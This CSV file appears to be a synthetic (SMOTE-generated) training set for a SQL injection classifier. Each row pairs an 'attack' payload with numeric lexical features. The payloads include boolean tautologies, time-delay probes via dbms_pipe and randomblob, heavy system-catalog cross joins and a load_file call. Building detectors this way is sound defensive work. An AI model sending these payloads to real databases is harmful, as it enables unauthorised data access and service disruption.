id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_001440,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""%""  =  """,nearest_attack_euclidean,R000022,2.3766232543612347,166.46597677940974,35.02268214706018,3.9253022857596767,57.954635705879646,17.78969375735531,61.465976779409736,29.255670536765045,0.3478990370305407,0.10718742367596767,0.3690817005378462,0.1758318387556454,0.7670116102951328,2.2329883897048672,0.5113410735300884,0.0,0.0,1.2556705367650443,0.0,13.232988389704868,0.7443294632349557,2.0,3.2329883897048672,6.789693757355309,0.2556705367650442,0.7443294632349557,0.25567053676504425,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9999999999999998,0.25567053676504425,0.0,0.25567053676504425,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.2329883897048672,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.7443294632349557
SMOTE_001441,attack,boolean,select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000001,0.8094649966442071,65.8288085200267,24.207202130006674,3.4941776964095372,22.963989349966624,6.072021300066755,26.68919680498999,10.103601065003337,0.35084676570436035,0.08922363549509632,0.4064109509554538,0.15351864784508956,0.0,0.10360106500333777,2.1036010650033377,0.0,0.8963989349966623,2.0,0.0,2.103601065003337,0.0,0.10360106500333766,0.10360106500333766,5.896398934996663,0.0,0.10360106500333771,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.8963989349966623,0.0,1.0,0.8963989349966623,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.7927978699933247
SMOTE_001442,attack,boolean,"1 where 3902  =  3902 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000005,0.35220604058201055,138.39371788918106,32.39895298153018,4.250954938385072,69.93089029023709,16.132984327176725,37.79790596306036,14.531937308706905,0.5055115806492909,0.1166819319265249,0.27301125138829774,0.10479523603588636,0.13298432717672637,1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,4.132984327176727,0.0,0.0,2.132984327176726,5.0,0.13298432717672626,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001443,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   ""vfvh""  =  ""vfvh",nearest_attack_euclidean,R000024,2.336099813763475,134.894384110977,32.352964147498014,3.7795466866124623,50.10600639648929,10.98822151150119,52.41185658999207,21.388299612994448,0.36671782484521837,0.08815220993380771,0.3907370976942056,0.15439286752676834,0.3294071705003967,2.01177848849881,0.0,0.0,0.3294071705003966,1.0,0.0,10.352964147498017,0.0,1.6705928294996033,1.0,5.352964147498017,0.3294071705003966,0.6705928294996034,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.6705928294996034,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001444,attack,boolean,"1' in boolean mode  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  #",nearest_attack_euclidean,R000008,1.8987340264771424,146.31246697115378,31.49167107051283,4.196180122148781,81.55830250641019,9.0,39.26249339423075,16.49167107051283,0.5566511448599238,0.0616389035683761,0.268487670631529,0.11322228094017107,0.754164464743585,0.2458355352564151,0.49167107051282993,0.0,1.0,1.0,0.0,5.0,0.245835535256415,0.0,3.0,2.49167107051283,0.754164464743585,0.24583553525641494,0.24583553525641497,0.754164464743585,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.754164464743585,0.245835535256415,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001445,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  'qomf' like 'qomf",nearest_attack_euclidean,R000012,2.3321982745893237,149.94958865692846,34.67506855717859,3.9907203364196393,61.70027422871436,10.0,53.59945154257127,24.64986288564282,0.41184698580481016,0.06671218468895733,0.35711169738492443,0.16432913212130812,2.0252056715357725,0.9747943284642276,0.0,0.0,0.0,0.3249314428214092,0.0,11.32493144282141,0.0,2.0,1.0,6.324931442821409,0.6750685571785908,0.3249314428214091,0.0,0.0,0.0,0.3249314428214092,1.0,0.0,0.0,0.0,0.9999999999999998,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001446,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000014,0.2264409136742461,74.27751670677873,23.0,3.615023530630984,20.881064268523403,13.0,28.396452438255327,12.0,0.2813431606653951,0.17507378758956899,0.38197647858543377,0.16160657315960214,3.8414190246978683,0.15858097530213155,0.0,0.0,0.039645243825532805,1.9603547561744672,0.0,4.0792904876510665,0.0,0.9603547561744672,0.9603547561744672,2.0,0.9603547561744672,0.039645243825532916,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001447,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000025,1.7465088836486988,108.57451912920928,29.29939331260022,3.739625029051448,44.8739124418095,11.503033436998894,38.40121337479956,13.796359875601325,0.39624931931453916,0.11222995631583434,0.36489358680114703,0.12662713756847946,1.8981799378006625,1.1102230246251565e-16,0.0,0.0,1.0,1.299393312600221,0.0,6.101820062199337,0.5987866252004419,0.700606687399779,1.2993933126002208,2.299393312600221,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.2993933126002208,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.299393312600221
SMOTE_001448,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   'ahjf'  =  'ahjf,nearest_attack_euclidean,R000031,2.807214837770923,137.0,30.985167838170046,3.5014962069874342,43.24072989885628,14.985167838170048,62.02966432365991,16.74443793931377,0.3156257656850824,0.10938078713992735,0.45277127243547377,0.12222217473951655,4.0,1.1102230246251565e-16,0.0,0.0,0.24814597977125596,2.0,0.0,9.503708040457488,0.0,0.24814597977125596,0.24814597977125596,2.7444379393137677,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.7518540202287439,0.0,1.248145979771256,0.0,0.248145979771256,0.24814597977125596,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7518540202287439,0.7518540202287439,4.248145979771256
SMOTE_001449,attack,boolean,"1  )   where 5333  =  5333 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000030,0.15541364150051623,139.75454851146495,32.0,4.163715997022698,69.0,16.0,40.00363880917197,14.750909702292992,0.49384314521844586,0.11451435251442223,0.28611684309153024,0.10552565917560167,0.0,1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,4.750909702292992,0.0,0.0,2.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001450,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000021,1.7451041225848893,136.4265379444897,31.531463603401345,4.117850688887298,71.58741455863947,7.237756324081615,39.951025296326456,17.650341765442153,0.534293420730602,0.051180446046429504,0.2866797472065315,0.12784638601643702,1.5874145586394617,1.1102230246251565e-16,1.4125854413605379,0.0,1.0,1.0,0.0,5.531463603401345,0.706292720680269,0.0,2.7062927206802687,3.412585441360538,1.0,0.0,0.706292720680269,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.29370727931973084,0.7062927206802689,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001451,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   ""vfvh""  =  ""vfvh",nearest_attack_euclidean,R000024,2.9945467759374162,148.66578966459224,33.11096494409871,3.869805144323169,50.99868449688838,16.22324539130904,55.88837730434548,25.555482472049356,0.3411613235005427,0.11120001342672714,0.37559577989108567,0.1720428831816445,0.0,2.1109649440987086,0.8890350559012911,0.0,0.0,1.4445175279506457,0.0,11.110964944098708,0.0,2.0,1.0,8.333552583851937,0.0,1.0,0.44451752795064553,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9999999999999998,0.5554824720493544,0.0,0.44451752795064564,0.5554824720493544,0.5554824720493543,0.44451752795064553,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.5554824720493543
SMOTE_001452,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'qjle'  =  'qjle",nearest_attack_euclidean,R000027,1.1556212183051588,117.72611965566612,28.4982310856049,4.160829644157215,73.4982310856049,4.245577714012246,26.48761759923429,13.494693256814696,0.6292137952499358,0.03473565526102371,0.22238051974374495,0.11367002974529558,3.2491155428024494,1.1102230246251565e-16,0.0,0.0,1.0,1.2491155428024494,0.0,2.498231085604899,0.4982310856048986,0.0,2.0,2.249115542802449,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.2491155428024494,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.2491155428024494
SMOTE_001453,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000004,0.6126983786831851,88.250852292611,23.749147707389,3.329318407673262,19.369460098028508,13.376278438916499,41.003409170443994,14.501704585221997,0.2198541149598078,0.15149639177029153,0.46442751455740294,0.16422197871249772,4.0,1.1102230246251565e-16,0.1254261463054993,0.0,0.0,2.0,0.0,6.250852292610999,0.25085229261099873,0.8745738536945005,1.0,2.1254261463054993,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.8745738536945007,0.1254261463054995,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001454,attack,boolean,"1""   )    )    as gawq where 4728  =  4728 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000010,1.5860378836123954,159.1965540837729,34.48034459162271,4.1858308503478545,79.11793245026374,16.48034459162271,46.11793245026374,17.48034459162271,0.4968808792751772,0.10372314094416211,0.28938508757278986,0.11001089220787082,0.4803445916227109,0.5196554083772891,2.0,0.0,1.0,2.0,0.0,5.5196554083772895,0.0,0.0,2.480344591622711,5.0,0.48034459162271087,0.5196554083772891,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001455,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000014,1.3416623413300899,73.8207964038186,23.5376107885442,3.662239676065201,19.745574826730206,14.971239557995395,27.2831856152744,11.820796403818601,0.26729652215806077,0.20311021363236165,0.3694878630550509,0.1601054011545267,3.2831856152744017,0.1792035961813997,0.5376107885441987,0.0,0.0,2.0,0.0,3.820796403818601,0.0,1.0,1.0,2.5376107885441987,0.8207964038186004,0.17920359618139964,0.17920359618139955,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.1792035961813996,0.0,1.641592807637201,0.1792035961813996,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001456,attack,boolean,"1""  )   where 7471  =  7471 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000020,0.17821055313095663,142.89185404092447,32.945927020462236,4.186691736372359,69.94592702046224,16.0,41.0,15.945927020462234,0.4895024441333823,0.11197392924392245,0.2869331936875513,0.11159043293514398,0.0,0.9459270204622335,2.0,0.0,1.0,2.0,0.0,5.0,0.0,0.0,2.0,5.0,0.0,0.9459270204622335,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.9459270204622335,0.054072979537766463,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001457,attack,boolean,"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000016,1.975691605080449,128.31095247696004,29.315873034698047,3.2999959651470956,30.436984158986682,14.46317460693961,62.094920676335704,21.315873034698047,0.23341343552720223,0.115625019890963,0.4860187252442646,0.16494281933757018,1.4631746069396097,4.0,0.0,0.7315873034698048,0.26841269653019517,1.7315873034698048,0.0,10.92634921387922,1.4631746069396097,0.0,0.7315873034698048,2.731587303469805,0.7315873034698048,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001458,attack,boolean,"1""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""fqap"" like ""fqap",nearest_attack_euclidean,R000023,2.0858114937394716,92.78113357077619,24.493586999086666,3.252420089491013,22.98717399817333,13.0,43.506413000913334,13.287546571689525,0.24608200887818238,0.14020664647205924,0.47014096140423633,0.143570383245522,0.35622671415523777,2.575093143379049,0.0,0.0,1.0,1.0,0.0,7.6437732858447625,0.0,0.35622671415523777,0.356226714155238,2.0,0.35622671415523777,0.6437732858447622,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.35622671415523777,0.0,0.0,0.35622671415523777,1.643773285844762,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.356226714155238
SMOTE_001459,attack,boolean,"1 where 3902  =  3902 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000005,2.4137364069777205,119.6331624776635,30.11469080685266,4.036646769285039,51.71799906281607,18.513745590863117,35.65829061941588,13.743127204568442,0.39585637393357465,0.18112382480026074,0.302716342733259,0.12030345853290564,0.0,0.3142181988578898,2.3142181988578896,0.0,0.6857818011421103,2.0,0.0,4.371563602284221,0.0,0.3142181988578897,1.6857818011421102,5.0,0.0,0.3142181988578897,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.6857818011421102,0.0,1.0,0.6857818011421103,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.371563602284221
SMOTE_001460,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000021,1.0932133292135089,143.00961929646877,33.0,4.134575958936857,71.0,9.0,43.67468274705731,19.334936549411463,0.4972696916074939,0.06303418626010487,0.304546548595787,0.13514957353661425,0.6674682747057311,0.332531725294269,2.0,0.0,1.0,1.0,0.0,6.334936549411462,1.0,0.0,3.0,4.0,0.6674682747057311,0.33253172529426894,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001461,attack,boolean,"1""   )    )    as gawq where 4728  =  4728 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000010,1.0532362623279496,156.66667404054712,33.747126691053346,4.111185234223125,79.21839360158684,14.229886837373442,45.965520292640186,17.25287330894665,0.5065559746763947,0.08974862947969696,0.29253289521256465,0.11116250063134371,0.0,1.0,2.0,0.0,1.0,1.747126691053349,0.0,5.7471266910533485,0.25287330894665117,0.0,2.252873308946651,4.7471266910533485,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.747126691053349,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.747126691053349
SMOTE_001462,attack,boolean,"1'  )   where 4297  =  4297 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000018,0.492690887636568,151.43882520960307,34.40895966375455,4.278907995956102,74.62090588209395,16.80298655458485,42.6059731091697,17.40895966375455,0.4926899138764224,0.1109975085586633,0.28149812907797744,0.11481444848693681,0.8029865545848507,1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,5.0,0.0,0.0,2.8029865545848507,5.0,0.8029865545848507,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001463,attack,boolean,select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000001,1.7862989274879935,66.8289855355751,24.457246383893775,3.538997555938369,21.713768080531125,8.572463838937754,26.31413042415934,10.228623191946888,0.3286615958652731,0.12263313116726096,0.39558184786297773,0.15312342510448823,0.0,0.22862319194688763,2.228623191946887,0.0,0.7713768080531125,2.0,0.0,2.2286231919468875,0.0,0.22862319194688752,0.22862319194688752,5.7713768080531125,0.0,0.22862319194688757,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.7713768080531125,0.0,1.0,0.7713768080531125,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.542753616106225
SMOTE_001464,attack,boolean," and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",nearest_attack_euclidean,R000003,4.085334192972101,82.56679259719739,22.0,3.2291098498987596,17.472924537324836,13.527075462675164,37.56679259719739,14.0,0.21301595108381058,0.1659480678886262,0.4498909402013015,0.17114504082626178,0.0,1.8916981492993479,0.0,0.0,0.4729245373248369,1.0,0.0,6.418773611974511,0.0,0.527075462675163,2.108301850700652,1.472924537324837,0.0,0.4729245373248369,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.472924537324837,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.527075462675163,0.527075462675163,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.527075462675163
SMOTE_001465,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""%""  =  """,nearest_attack_euclidean,R000022,2.8353437606758845,158.03922709223178,32.467573398804895,3.8885247200272377,55.40272019641468,16.0,58.785826846713455,27.850680049103666,0.3498198930023373,0.10191869410313092,0.37162758230370796,0.17663383059082388,0.0,3.3831066502987768,0.0,0.0,0.0,1.383106650298777,0.0,12.467573398804891,0.616893349701223,2.0,2.8506800491036692,6.149319950896331,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,1.383106650298777,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.8506800491036692,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.233786699402446
SMOTE_001466,attack,boolean,"1'||  (  select 'ersu' where 4123  =  4123 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000006,2.4674579145331257,154.59033120851444,35.03613248340578,3.9894246647997473,50.51806624170289,20.40661592298006,55.14758280212862,28.51806624170289,0.3273008828166022,0.1311204208714544,0.35716655951397636,0.18441213679796709,1.8885496812771687,1.4819337582971084,1.2590331208514458,0.0,0.0,2.0,0.0,10.629516560425724,0.0,2.0,1.0,10.518066241702892,0.6295165604257229,0.37048343957427704,0.6295165604257229,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9999999999999998,0.6295165604257229,0.0,0.6295165604257229,0.0,1.370483439574277,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.629516560425723
SMOTE_001467,attack,boolean,"1""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""wvma"" like ""wvma",nearest_attack_euclidean,R000017,1.0471026748580325,83.7817007895049,24.112680315801956,3.3435760499325435,20.596254070204562,13.0,38.18544671930032,12.0,0.24282741325559176,0.15584335001754585,0.4574738367106662,0.14385540001619615,0.18544671930032575,3.2582131227986966,0.0,0.0,1.0,1.0,0.0,6.185446719300326,0.0,0.1854467193003259,0.18544671930032575,2.0,0.1854467193003258,0.8145532806996741,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.1854467193003259,0.0,0.0,0.1854467193003258,1.814553280699674,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.1854467193003257
